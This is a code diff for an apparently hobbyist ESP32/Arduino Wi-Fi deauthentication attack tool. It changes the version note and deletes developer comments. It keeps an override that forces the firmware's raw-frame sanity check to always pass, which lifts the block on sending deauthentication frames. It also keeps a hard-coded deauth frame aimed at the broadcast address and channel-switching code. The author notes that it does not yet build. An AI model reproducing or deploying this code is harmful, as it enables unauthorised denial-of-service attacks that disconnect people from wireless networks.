@@ -6,7 +6,7 @@
 
    DISCLAIMER: This code is for educational purposes only.
    Unauthorized deauthentication or jamming is illegal.
-   V0.0.5 /UNTESTED/
+   V0.0.5 /WONT WORK ON ARDUINO; Y? Cant change the linker hence the error / ini cumming s00n
 */
 
 #include <Arduino.h>
@@ -18,19 +18,6 @@ typedef uint8_t MacAddr[6];
 extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3){
   return 0;
 }
-/*gotta use ghindra to reverse engineer and check out the function restriction for myself
- this basically makes sure that the sanity check restriction(preventing uncorrupted frames, deauth authentication and disassociation frames from being sent) to always return 0; basically saying yes! Im thinking this might become a problem while trouble shooting coz you know lets say you make a frame structure horribly something like a syntax error you wont know until you test it 
-
-something like this may be a quick fix 
-extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t frame_len) {
-    if (frame_len < 24) {  // 24 bytes is roughly roughlyyy the minimum frame header size
-        printf("[ERROR] Frame too short!\n");
-        return -1;  // Reject this frame
-    }
-    return 0; // Otherwise, allow it
-}
-
-*/
 const uint8_t deauthPacket[] = {
     0xC0, 0x00, 0x3A, 0x01,  //Type of frame & duration  (C0 FOR DEAUTH, A0 FOR DISSASSOCIATE)
     0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Target MAC (to be replaced), set to bradcast address as default
@@ -50,11 +37,6 @@ Experiment with Different Reason Codes (in little-endian architecture):
 uint8_t buffer[sizeof(deauthPacket)];
 uint16_t seqnum = 0;  
 
-/*Handling the channel to send the frames in  ***mmh something smells fishhy about the change_channel function with the esp_err_t*** 
-i like how its efficient by not just sending frames in all the 13 channels, but by listening to the active one
-here comes in the issue of channel hopping especially when targeting multiple devices
-currently the non overlapping ones are 1,6 and 11 but ill need to test while documenting if others in between do overlap
-*/
 esp_err_t change_channel(uint8_t channel) {
     return esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
 }
@@ -128,8 +110,3 @@ void loop() {
 
     delay(2000);
 }
-/*oh my conclusion: i gotta change the linker to acually make this work. 
-Adding the function just wont help ill teachmyself the esp-idf compilation way to customise the linker 
-be back when im done 
-
-*/
